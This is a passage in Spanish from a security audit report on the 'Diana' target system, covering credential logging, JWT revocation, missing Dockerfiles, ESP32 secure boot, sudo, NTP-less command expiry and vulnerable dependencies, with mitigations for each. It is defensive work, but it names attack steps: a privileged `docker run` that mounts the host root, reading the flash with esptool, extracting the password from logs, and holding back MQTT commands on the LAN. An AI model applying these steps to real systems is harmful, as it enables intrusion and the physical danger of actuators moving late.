`/home/diana-admin/.ssh/`. Es el modo de uso documentado de cAdvisor, no un error de quien
escribió el compose, pero convierte cualquier ejecución de código en ese contenedor en
lectura completa de los secretos del sistema.

La segunda: `ports: 9090:8080` publica en **todas** las interfaces del anfitrión, no en
`127.0.0.1`. cAdvisor no tiene autenticación.

**Impacto real:** hoy, contenido. El perfil `monitoring` no está activo y, aunque lo
estuviera, la política del cortafuegos es `policy drop` y no hay regla que abra el 9090:
sólo pasan 22, 80/443, 1883 y el 41641/udp de Tailscale. Lo verificado en `nft list ruleset`
sostiene esta afirmación. El riesgo es de deriva: basta que alguien añada una regla para el
9090 —o que un contenedor de la red `internal` sea comprometido, ya que cAdvisor también
está en esa red— para que la métrica de todos los contenedores quede legible sin
credenciales.

**Mitigación (WP-01):** cambiar la publicación a `"127.0.0.1:${MONITORING_HTTP_PORT:-9090}:8080"`
y acceder por túnel SSH, que es lo coherente con una VM sin exposición externa. Documentar
en `infrastructure/monitoring/README.md` que activar el perfil implica conceder lectura del
sistema de ficheros completo del anfitrión.

---

## F-11 · La contraseña inicial del administrador se escribe en el log del contenedor

**Severidad: Media.**

**Activos:** A3, A7.

**Evidencia — DEDUCIDO** (`server/backend/src/modules/auth/auth.service.ts:68-95`):

```ts
const fromEnv = this.config.admin.password;
const password = fromEnv ?? randomBytes(18).toString('base64url');
...
  this.logger.warn(
    `Cuenta inicial creada. Usuario: ${this.config.admin.username} · ` +
      `Contraseña generada: ${password} · Cámbiela en el primer acceso.`,
  );
```

El propio código lo declara: *"Único punto del sistema donde se escribe una credencial, y
sólo porque se acaba de generar y no hay otra forma de entregarla al operador."* La
justificación es honesta y el problema es real —hay que entregar la credencial de algún
modo—, pero la solución elegida deja la contraseña en un fichero persistente.

Y por F-04, la rama que se ejecuta es **siempre** ésta: `compose.yml` no pasa
`DIANA_ADMIN_PASSWORD`, así que `fromEnv` es `null` y la contraseña siempre se autogenera y
siempre se registra.

**Reproducción** (no ejecutada, F-13): `docker compose logs backend | grep 'Contraseña
generada'` tras el primer arranque con la base de datos vacía.

**Impacto real:** los logs van al driver `json-file` (`compose.yml`, ancla
`*default-logging`), es decir a `/var/lib/docker/containers/<id>/<id>-json.log` en el
anfitrión, legible por root y por cualquier miembro del grupo `docker`. Con rotación, la
línea sobrevive mientras no se agote el buffer. Dos atenuantes reales: la cuenta se crea con
`mustChangePassword: true` (`auth.service.ts:78`), y sólo se crea si no hay ningún usuario
(`:63-64`), así que la ventana es el arranque inicial y termina en cuanto el operador cambia
la contraseña. El agravante es que quien lea ese log tiene ya, por F-15, acceso al grupo
`docker` y por tanto a todo; el hallazgo importa sobre todo si el log se exporta o se
comparte en una incidencia.

**Mitigación (WP-02):** escribir la credencial en un fichero de un volumen con permisos
`0600` (por ejemplo `/app/exports/.initial-admin`) y registrar en el log únicamente la ruta,
o exigir `DIANA_ADMIN_PASSWORD` como variable obligatoria en el primer despliegue (que es lo
que ya pretendía `compose.yml`, sólo que la variable no se pasa: F-04). Registrar
explícitamente que la contraseña se ha entregado y borrar el fichero tras el primer cambio.

---

## F-12 · Los permisos viajan dentro del JWT y no hay revocación

**Severidad: Media.**

**Activo:** A6.

**Evidencia — DEDUCIDO** (`auth.service.ts:117-123`, `jwt.strategy.ts:24-31`,
`configuration.ts:64`):

```ts
// auth.service.ts — al hacer login
const permissions = user.role.permissions;
const token = await this.jwt.signAsync({ sub, username, role: user.role.name, permissions });

// jwt.strategy.ts — en cada petición
validate(payload: JwtPayload): AuthenticatedUser {
  return { userId: payload.sub, username: payload.username, role: payload.role,
           permissions: payload.permissions ?? [] };
}
```

`validate()` no consulta la base de datos: reconstruye el usuario a partir de lo que dice el
token. La duración por defecto es `'8h'` (`configuration.ts:64`,
`process.env.JWT_EXPIRES_IN ?? '8h'`), y no existe lista de revocación, ni `tokenVersion` en
el usuario, ni comprobación de `user.active` en cada petición.

**Impacto real:** entre que un administrador retira un rol, desactiva una cuenta o cambia
una contraseña y el momento en que eso surte efecto pueden pasar hasta 8 horas. El
`active: false` se comprueba en `validate(username, password)` durante el login
(`auth.service.ts:105`), pero no en las peticiones posteriores con un token ya emitido.
Escenario concreto: se despide a un operador, se le desactiva la cuenta, y sigue borrando
partidas hasta que su token caduca. También significa que F-07 (token en claro por la LAN)
tiene una ventana de reutilización de 8 horas.

**Mitigación (WP-02):** en `JwtStrategy.validate`, cargar el usuario por `sub` y rechazar si
no existe, está inactivo o su rol cambió después del `iat` del token; los permisos deben
leerse de la base de datos, no del token. Es una consulta por petición, aceptable con
PostgreSQL local y cacheable. Alternativa más barata: un campo `tokenVersion` en `User` que
se incremente al desactivar o cambiar de rol, y compararlo con un `claim` del token. Reducir
`JWT_EXPIRES_IN` no resuelve el problema, sólo acorta la ventana.

---

## F-13 · Faltan los `Dockerfile` de backend y worker: el stack no se puede ejecutar

**Severidad: Alta.** No es una vulnerabilidad de explotación: es lo que impide verificar
todas las demás. Se registra como hallazgo de seguridad porque **invalida cualquier
afirmación sobre el comportamiento en ejecución del sistema**, incluidas las de este
informe.

**Activo:** todos, indirectamente.

**Evidencia — OBSERVADO** (`evidence/analisis-codigo.md`, `evidence/vm-exposicion.md`):

```
$ find . -name 'Dockerfile*' -not -path '*/node_modules/*'
./server/frontend/Dockerfile
./simulators/target-module/Dockerfile

referenciados por compose.yml:
 76:  context: ./server/frontend       ✓
109:  context: ./server/backend        ✗ no existe Dockerfile
161:  context: ./server/worker         ✗ no existe Dockerfile
209:  context: ./server/backend        ✗ (migrate)
349:  context: ./simulators/target-module ✓
378:  context: ./server/backend        ✗ (contracts)
```

Cuatro de los seis servicios que construyen imagen apuntan a un contexto sin `Dockerfile`.
En la VM, `docker ps` devuelve la cabecera y ninguna fila: cero contenedores en marcha.

**Impacto real:** F-02, F-03, F-05, F-06, F-08, F-09, F-11 y F-12 se entregan con
procedimiento de reproducción y **sin confirmación en ejecución**, porque no hay ejecución
posible. La primera vez que el stack arranque, esos ocho procedimientos deben ejecutarse
antes de dar el sistema por revisado. Este informe no sustituye esa verificación.

Además, cuando los `Dockerfile` se escriban, introducirán decisiones de seguridad que aquí
no se han podido auditar: usuario no root, imagen base, `HEALTHCHECK`, gestión de secretos
en la construcción. Deben pasar por una segunda revisión.

**Mitigación:** en curso en **WP-08**. Cuando estén, WP-10 debe reabrir la verificación de
los ocho hallazgos marcados como no reproducidos.

---

## F-14 · Firmware sin secure boot ni cifrado de flash

**Severidad: Alta.** Acceso físico a un módulo entrega credenciales MQTT auténticas, y con
ellas F-02.

**Activos:** A2 (credenciales en NVS), A5 (canal OTA / integridad del firmware).

**Evidencia — DEDUCIDO** (`firmware/esp32/sdkconfig.defaults:46-51`,
`evidence/firmware-ota.md`):

```
46:CONFIG_SECURE_SIGNED_APPS_NO_SECURE_BOOT=y
47:CONFIG_SECURE_SIGNED_ON_UPDATE_NO_SECURE_BOOT=y
48:CONFIG_SECURE_BOOT_SIGNING_KEY="secure_boot_signing_key.pem"
51:CONFIG_NVS_ENCRYPTION=y
```

El sufijo `NO_SECURE_BOOT` es literal: se firman las imágenes y se verifica la firma **en las
actualizaciones OTA**, pero el arranque no está encadenado a una raíz de confianza en
eFuses. Nada impide reflashear el dispositivo por USB/UART con una imagen propia, ni leer la
flash completa con `esptool.py read_flash`.

`CONFIG_NVS_ENCRYPTION=y` merece un aviso concreto: el cifrado de NVS deriva su protección
de que las claves vivan en la partición `nvs_keys` y de que **ésta** esté protegida por
cifrado de flash. Sin `CONFIG_SECURE_FLASH_ENC_ENABLED`, las claves de NVS están en la flash
en claro, y el cifrado de NVS deja de ser una barrera frente a quien tiene el chip.

El resto de la cadena OTA está bien construida y hay que decirlo: se verifica sha256, tamaño,
placa y versión; si el HAL no tiene implementación de verificación de firma, **falla cerrado**
(`ota.c`: `if (!ota->hal || !ota->hal->ota_verify_signature) return reject(...)`); la firma se
delega a ESP-IDF en lugar de reimplementar criptografía, que es la decisión correcta; la
partición sólo se marca arrancable después de verificar; y hay rollback A/B. El eslabón que
falta no está en la lógica OTA, está debajo de ella.

**No verificado:** el firmware **nunca se ha compilado**. El propio fichero lo declara: *"este
fichero NO se ha podido validar con un build real de ESP-IDF en el entorno donde se escribió
(no hay toolchain instalado)"*. Tampoco existe hardware. Todo lo anterior es lectura de
configuración, no comprobación sobre un dispositivo.

**Impacto real:** T5, acceso físico. En una instalación deportiva, los módulos están
expuestos por definición: alguien los monta, los desmonta y los transporta. Quien se lleve
uno durante diez minutos obtiene sus credenciales MQTT y, por F-02, la capacidad de
falsificar impactos de todos los demás sin volver a tocar hardware.

**Mitigación (WP-04):** decidir explícitamente entre activar secure boot v2 y cifrado de
flash —que es irreversible en los eFuses, complica el desarrollo y exige custodia rigurosa de
la clave privada de firma— o aceptar el riesgo por escrito apoyándose en la custodia física.
Esta segunda opción **sólo es defendible si F-02 se cierra antes**: mientras una credencial
robada sirva para suplantar a los demás módulos, el compromiso físico de uno compromete el
sistema entero. Ver `accepted-risks.md`, R-03.

---

## F-15 · `diana-admin` con `NOPASSWD:ALL`, grupo `docker` y una sola clave SSH

**Severidad: Media.** Dictamen (b) del encargo.

**Activo:** A7 (la VM y su acceso).

**Evidencia — OBSERVADO** (`evidence/vm-exposicion.md`):

```
$ id
uid=1000(diana-admin) gid=1000(diana-admin) groups=1000(diana-admin),27(sudo),994(docker)
$ sudo cat /etc/sudoers.d/90-diana-admin
diana-admin ALL=(ALL) NOPASSWD:ALL
$ sudo sshd -T | grep auth
permitrootlogin no
pubkeyauthentication yes
passwordauthentication no
kbdinteractiveauthentication no
permitemptypasswords no
maxauthtries 6
$ wc -l /home/diana-admin/.ssh/authorized_keys
1
$ sudo passwd -S diana-admin
diana-admin L 2026-07-20 0 99999 7 -1      # L = cuenta con contraseña bloqueada
```

### Dictamen

**La configuración es aceptable, y el `NOPASSWD:ALL` no es el problema que aparenta.**

El razonamiento es el siguiente. `diana-admin` pertenece al grupo `docker`. Pertenecer al
grupo `docker` **ya equivale a root sin contraseña**: cualquiera que pueda hablar con el
socket de Docker lanza `docker run -v /:/host --privileged` y tiene el sistema entero. Esto
no es una opinión, es una propiedad conocida y documentada del diseño de Docker. Por tanto,
quitar `NOPASSWD` de sudoers no reduciría el privilegio efectivo ni un ápice: dejaría una
puerta cerrada con llave al lado de una pared derribada. Y el grupo `docker` es necesario
aquí, porque el trabajo de esta cuenta es operar el stack.

Segundo: la contraseña de la cuenta está **bloqueada** (`passwd -S` devuelve `L`), igual que
la de root. No hay contraseña que pedir. Un `sudo` con contraseña sobre una cuenta sin
contraseña no es un control, es un bloqueo operativo.

Tercero, y es lo que sostiene el dictamen: lo que realmente protege la VM está bien puesto.
`permitrootlogin no`, `passwordauthentication no`, `kbdinteractiveauthentication no`,
`permitemptypasswords no` y una única clave autorizada. La superficie de autenticación
remota se reduce a la posesión de esa clave, y no hay ningún camino de fuerza bruta que
merezca ese nombre.

**Con la condición explícita** que ese mismo diseño impone: **la clave privada del operador
es el único factor de autenticación de toda la instalación**. No hay segundo factor, no hay
contraseña de sudo que frene un movimiento lateral, y no hay separación entre "entrar" y
"ser root". Quien obtenga esa clave —T6— tiene el sistema completo desde el primer segundo:
la VM, los contenedores, la base de datos, el `.env` con las credenciales MQTT y el broker.
No existe ningún control que le imponga un solo paso adicional.

De ahí que el dictamen sea "aceptable" y no "correcto". Es aceptable **si y sólo si** la
clave privada está protegida con frase de paso y vive en un dispositivo que no es
compartido. Esa condición no se ha verificado —está en el portátil del operador, fuera del
alcance de esta revisión— y por eso queda registrada en `accepted-risks.md` (R-01) para que
alguien la firme.

**Mitigación (WP-08), por orden de valor:**
1. Comprobar que la clave privada tiene frase de paso. Si no la tiene, ponérsela hoy. Es la
   medida con mejor relación coste/beneficio de todo el informe.
2. Añadir una segunda clave de recuperación, custodiada aparte. Con una sola clave, perderla
   deja la VM inaccesible: el riesgo aquí es de disponibilidad, no de confidencialidad.
3. Registrar el uso de sudo (`Defaults log_input, log_output` o `auditd`) para tener rastro
   de lo que se hace con ese privilegio.
4. **No** convertir `NOPASSWD:ALL` en `sudo` con contraseña mientras la cuenta esté en el
   grupo `docker`: da sensación de seguridad sin añadir ninguna.

---

## F-16 · Comandos aceptados sin verificar caducidad cuando no hay hora sincronizada

**Severidad: Media.** Dictamen (c) del encargo.

**Activo:** A4 (control de actuadores de un sistema que dispara proyectiles).

**Evidencia — DEDUCIDO** (`firmware/esp32/components/diana_core/src/command.c:200-255`,
`firmware/esp32/components/diana_platform_esp/src/net_w5500.c:51-93`):

```c
/* --- 7. Caducidad --- Guarda monotónica local: retraso del PROPIO firmware */
uint64_t held_us = (clock->now_us >= clock->recv_us) ? (clock->now_us - clock->recv_us) : 0;
if (held_us > (uint64_t)cmd->expires_in_ms * 1000ULL) { ... return verdict(DIANA_CMD_RESULT_EXPIRED, d); }

bool clock_ok = (clock->epoch_ms > 0);          // command.c:215
if (clock_ok) {
    /* comprobación de issued_at_ms en el futuro y de edad real */
}

/* --- 8. Aceptado: consume y PERSISTE el nonce --- */
g->last_nonce[cmd->issuer] = cmd->nonce;
persist_nonces(g);
remember(g, cmd->command_id);
g->accepted++;

if (!clock_ok) {
    g->accepted_without_clock++;                 // command.c:247
    return verdict(DIANA_CMD_RESULT_ACCEPTED,
                   "caducidad no verificada: sin hora sincronizada; "
                   "defensa por nonce persistido");
}
```

Sin SNTP, `epoch_ms` vale 0, el bloque `if (clock_ok)` se salta entero y el comando **se
ejecuta**, declarando en el veredicto que la caducidad no se comprobó. El firmware arranca
SNTP contra `CONFIG_DIANA_NTP_HOST` (`net_w5500.c:62-79`) y avisa por log si no está
disponible.

### Dictamen

**Es aceptable, con una condición que hoy no se cumple.**

El diseño no es negligente y hay que ser justo con él. Sobrevive un tercio de mérito en cada
una de tres defensas que sí operan sin reloj:

1. **El nonce monótono persistido en NVS** (`command.c:245-249`, con `persist_nonces`). Un
   comando capturado y reproducido después tiene un nonce que ya no es mayor que el último
   consumido, y se rechaza. Esto sobrevive incluso a un reinicio del módulo, que es lo que
   hace que la palabra "persistido" cuente.
2. **La guarda monótona local** (`held_us`, líneas 203-212). Mide cuánto tiempo lleva el
   mensaje retenido *dentro del propio módulo* desde que lo recibió, y no depende de ningún
   reloj de pared. Frena el retraso introducido en la cola local.
3. **La honestidad del veredicto.** El módulo no finge: devuelve `ACCEPTED` con el detalle
   `"caducidad no verificada: sin hora sincronizada"`, que llega al backend en
   `module/…/status.last_command.detail`. El sistema *sabe* que aceptó a ciegas, y eso es
   auditable.

Lo que ninguna de las tres cubre es el ataque que importa: **la retención en el canal**. Un
atacante en la LAN —el mismo de F-03, que ya lee y escribe MQTT en claro— captura un comando
legítimo antes de que llegue al módulo, lo retiene, y lo entrega media hora después, cuando
el escenario físico ha cambiado. El nonce sigue siendo el mayor visto, porque el módulo
nunca llegó a consumirlo. `held_us` se mide desde la recepción, que acaba de ocurrir, así
que vale casi cero. Y `expires_in_ms`, que es precisamente el mecanismo diseñado para esto,
no se evalúa. El comando se ejecuta como nuevo.

Para un sistema que dispara proyectiles, "mover un objetivo media hora tarde" no es un fallo
de comodidad. Es un objetivo que se mueve cuando hay una persona delante en lugar de cuando
el campo estaba despejado.

Por eso el dictamen no es "es inaceptable" —el nonce persistido bloquea la reproducción, que
es el ataque más obvio— sino **aceptable únicamente si el conjunto de comandos que se
ejecutan sin reloj se restringe a los que no tienen consecuencia física**. El contrato ya
define un techo de 30 s para las acciones críticas; esa distinción existe. Falta aplicarla
aquí. Concretamente: **sin `clock_ok`, un comando que mueva un actuador o arme el sistema
debe rechazarse con `EXPIRED`, no aceptarse con una nota**; un comando de consulta,
diagnóstico o configuración no crítica puede seguir aceptándose como ahora.

Y hay una segunda condición, que es de despliegue: el servidor NTP contra el que apunta
`CONFIG_DIANA_NTP_HOST` **no se ha verificado que exista**. Diana no tiene salida a Internet
por diseño, así que la hora tiene que darla algo dentro de la LAN. Si nadie la sirve,
`clock_ok` es falso *siempre*, y la rama degradada deja de ser un modo excepcional para
convertirse en el modo normal de funcionamiento. Eso es lo que transforma un hallazgo medio
en uno grave.

Nota adicional: SNTP va sin autenticar, así que el mismo atacante de la LAN puede desplazar
el reloj del módulo. Con NTP autenticado o con hora entregada por el backend por MQTT
firmado, esa vía se cierra; con SNTP plano, `clock_ok = true` no es lo mismo que "la hora es
correcta". No cambia el dictamen, pero impide considerar el reloj una defensa dura.

**Mitigación (WP-04 y WP-08):**
1. Clasificar los comandos en críticos y no críticos —la lista ya está implícita en el techo
   de 30 s del contrato— y rechazar los críticos cuando `clock_ok` sea falso.
2. Verificar que existe un servidor NTP alcanzable en la LAN y que `CONFIG_DIANA_NTP_HOST` lo
   apunta. Registrarlo en la documentación de despliegue.
3. Exponer `accepted_without_clock` (ya existe, `command.h:118`) en la telemetría y alertar
   en el panel si crece: un módulo operando sin hora debe ser visible, no silencioso.

---

## F-17 · Dependencias vulnerables sin resolver en backend, worker y simuladores

**Severidad: Media.** Ninguna de las vulnerabilidades identificadas es explotable de forma
remota contra el sistema desplegado con la información disponible, pero el conjunto es
grande y está sin gestionar.

**Activo:** A7 y la cadena de construcción.

**Evidencia — OBSERVADO** (`evidence/npm-audit.md`, ejecutado 2026-07-20T23:33:32+02:00):

| Componente | Total | Desglose |
|---|---|---|
| `server/backend` | **23** | 1 baja, 10 medias, **12 altas** |
| `server/frontend` | 0 | — |
| `server/worker` | **3** | 3 altas |
| `simulators` | **5** | 3 medias, 1 alta, **1 crítica** |

Lo que el informe nombra explícitamente:

- **backend** · `picomatch 4.0.0-4.0.3` (alta): inyección de método en clases POSIX
  (GHSA-3v7f-55p6-f55p) y ReDoS por cuantificadores extglob (GHSA-c2c7-rcm5-vvqj). Llega por
  `@nestjs/schematics`, es decir por herramienta de desarrollo.
- **backend** · `webpack 5.49.0-5.104.0`: dos evasiones de la lista `allowedUris` de
  `buildHttp` con efecto SSRF en tiempo de construcción (GHSA-8fgc-7cc6-rx7x,
  GHSA-38r7-794h-5758). Llega por `@nestjs/cli`.
- **backend** · `uuid <11.1.1` (media): falta comprobación de límites del buffer en v3/v5/v6.
- **worker** · `effect <3.20.0` (alta): pérdida y contaminación de contexto de
  `AsyncLocalStorage` entre fibras bajo carga concurrente con RPC (GHSA-38f7-945m-qr2g).
  Llega arrastrada por `@prisma/config` → `prisma`.
- **simuladores** · `esbuild <=0.24.2` (media): el servidor de desarrollo acepta peticiones de
  cualquier sitio web y devuelve la respuesta. Arrastra `vite`, `vitest`, `vite-node`.

**Lo que no se sabe y no se va a inventar:** el resumen de `simulators` declara **1
vulnerabilidad crítica** que el cuerpo del informe **no nombra**, y el de `backend` declara
12 altas de las que sólo tres paquetes aparecen detallados. La salida recogida es la de
`npm audit` en formato humano, que agrupa y resume. **No se ejecutó `npm audit --json`**, que
es lo que enumera una a una. La crítica de simuladores está sin identificar en esta
revisión, y eso es una carencia de este informe, no un dato ausente del ecosistema.

**Impacto real, con matices que importan para no inflar la severidad:** el grueso —
`picomatch`, `webpack`, `esbuild`— está en dependencias de desarrollo y construcción, no en
el camino de ejecución del contenedor de producción. Su explotación exige control sobre el
proceso de build o sobre el servidor de desarrollo, no sobre la API desplegada. La
excepción es `effect` en el worker: es una dependencia transitiva de `prisma`, y la
contaminación de `AsyncLocalStorage` bajo concurrencia sí puede darse en ejecución real, con
consecuencia de cruce de contexto entre operaciones. Es la que hay que mirar primero.

**Mitigación (WP-02, WP-05, WP-07):**
1. Ejecutar `npm audit --json` en los cuatro componentes e identificar la crítica de
   simuladores y las 12 altas del backend, una por una. Sin eso no hay decisión informada.
2. Priorizar `effect`/`prisma` en el worker: es la única con camino de ejecución en
   producción.
3. Aplicar `npm audit fix` donde no rompa; las que exigen `--force` (`@nestjs/cli`,
   `@nestjs/schematics`, `vitest 4`) van en una tarea aparte, con pruebas.
4. Añadir `npm audit --audit-level=high` al CI de WP-07, para que el número deje de crecer en
   silencio.
5. Para lo que se decida no arreglar, dejarlo escrito en `accepted-risks.md` (R-04) con la
   razón.

---

## F-18 · `fail2ban` instalado pero inactivo

**Severidad: Baja.**

**Activo:** A7.

**Evidencia — OBSERVADO** (`evidence/vm-exposicion.md`):

```
$ systemctl is-active fail2ban unattended-upgrades
inactive
active
```

**Impacto real: bajo, y hay que decir por qué.** `fail2ban` protege sobre todo de la fuerza
bruta contra contraseñas, y en esta VM **no hay autenticación por contraseña**:
`passwordauthentication no`, `kbdinteractiveauthentication no`, `permitrootlogin no` y la
contraseña de la cuenta bloqueada (ver F-15). Un atacante no tiene contra qué hacer fuerza
bruta por SSH. El servicio aporta aquí protección frente a agotamiento de recursos por
conexiones repetidas y ruido en los logs, no frente a un compromiso de credenciales.

Lo que sí conviene registrar es lo contrario: `unattended-upgrades` **está activo**, y eso es
el control con más valor real de los dos para una VM sin exposición externa. Está bien
puesto.

**Mitigación (WP-08):** `systemctl enable --now fail2ban` con el jail `sshd`. Es una línea y
cierra el hallazgo. Con menor prioridad que F-15.1 (frase de paso en la clave privada), que
protege del vector que realmente existe.

---

# Dictámenes solicitados

El encargo pide tres pronunciamientos explícitos. Los dos primeros están desarrollados en
sus hallazgos; se recogen aquí en forma de conclusión para que no haya ambigüedad.

## (a) ¿Diana repite el CORS abierto y el JWT_SECRET por defecto de S9-RC?

**CORS abierto: SÍ, pero sólo en el WebSocket. NO en la API REST.**

Los dos casos son distintos y hay que separarlos porque la evidencia inicial los mezclaba.

- **REST: no.** `main.ts:24-27` hace
  `origin: config.corsOrigins.length > 0 ? config.corsOrigins : false`. El caso degenerado es
  `false`, es decir **rechazar todos los orígenes cruzados**, no `true`. Está construido para
  fallar cerrado y lo hace. Ahora bien, por F-04 la lista está **siempre vacía** en el
  despliegue actual, porque `compose.yml:129` entrega `CORS_ORIGIN` y el código lee
  `CORS_ORIGINS`. Es decir: el CORS del REST hoy es más restrictivo de lo que el operador
  cree, no menos. Es un fallo de configuración, no un fallo de seguridad, y se corrige junto
  con F-04.
- **WebSocket: sí.** `live.gateway.ts:20` tiene `cors: { origin: true }`, que en Socket.IO
  refleja el `Origin` recibido: acepta cualquiera. Y como el canal además no autentica
  (F-05), no hay un segundo control detrás. **Esto sí es el fallo de S9-RC, en el mismo
  proyecto y en la misma capa.**

**JWT_SECRET por defecto: SÍ, la reserva insegura existe en el código, y NO, hoy no se está
usando en la VM 109.**

La contradicción aparente entre `configuration.ts:51` y `:63` se resuelve leyendo la
condición completa: el `throw` de la línea 51 exige `!secret` **y**
`NODE_ENV === 'production'`. La reserva `'desarrollo-inseguro-cambiar'` de la línea 63 se
aplica en cuanto una de las dos condiciones no se da.

Condiciones exactas de arranque con secreto inseguro: **`JWT_SECRET` vacío o ausente y
`NODE_ENV` distinto de `production`** (incluido ausente, vacío, `development`, `test` o
cualquier errata como `Production` con mayúscula, porque la comparación es sensible a
mayúsculas y estricta).

En la VM 109, hoy: `NODE_ENV=production` está en `/opt/diana/.env`, `compose.yml` lo
propaga, y `JWT_SECRET` no aparece ni en el `.env` (`grep` = 0) ni en `compose.yml`
(`grep` = 0). Se cumple la primera rama: **el backend no arrancaría; lanzaría en
`loadConfiguration()`**. No hay hoy en la VM 109 ningún token firmado con el secreto
publicado, sencillamente porque no hay ningún backend en marcha (`docker ps` vacío, y no
puede haberlo por F-13).

**Dictamen: Diana no repite el fallo hoy, pero conserva la trampa que lo produce.** Una
errata en `NODE_ENV` o un intento de depurar el bucle de reinicio bajándolo a `development`
convierte el sistema en vulnerable en un solo paso, sin ninguna alarma. El fallo cerrado que
protege una rama y deja la otra abierta no es un fallo cerrado. **La reserva
`'desarrollo-inseguro-cambiar'` debe desaparecer del código** (F-04, mitigación 3), y
`JWT_SECRET` debe pasarse con `${...:?}` en `compose.yml` (mitigación 1). Con esas dos
correcciones, el fallo de S9-RC queda estructuralmente imposible en Diana, que es el listón
correcto: no "no está ocurriendo", sino "no puede ocurrir".

## (b) Sudo de la VM

Desarrollado en **F-15**. En una línea: **aceptable**, porque el grupo `docker` ya concede
root y `NOPASSWD` no cambia el privilegio efectivo, y porque lo que de verdad protege la VM
—sin root remoto, sin contraseñas, una sola clave— está bien puesto; **con la condición no
verificada** de que la clave privada del operador tenga frase de paso, que es hoy el único
factor de autenticación de toda la instalación. Registrado como R-01 en `accepted-risks.md`.

## (c) Caducidad de comandos sin NTP

Desarrollado en **F-16**. En una línea: **aceptable sólo para comandos sin consecuencia
física; inaceptable tal como está para los que mueven actuadores**. El nonce persistido
bloquea la reproducción, la guarda monótona frena el retraso interno y el veredicto es
honesto sobre lo que no comprobó —tres cosas bien hechas—, pero ninguna cubre la retención
del comando en el canal antes de su primera entrega, que es exactamente para lo que existe
`expires_in_ms`. En un sistema que dispara proyectiles, ejecutar tarde una orden de
movimiento no es un fallo de comodidad. Y hay un agravante de despliegue sin resolver: no
está verificado que exista servidor NTP en una LAN sin salida a Internet; si no lo hay, la
rama degradada no es el caso excepcional, es el único caso.
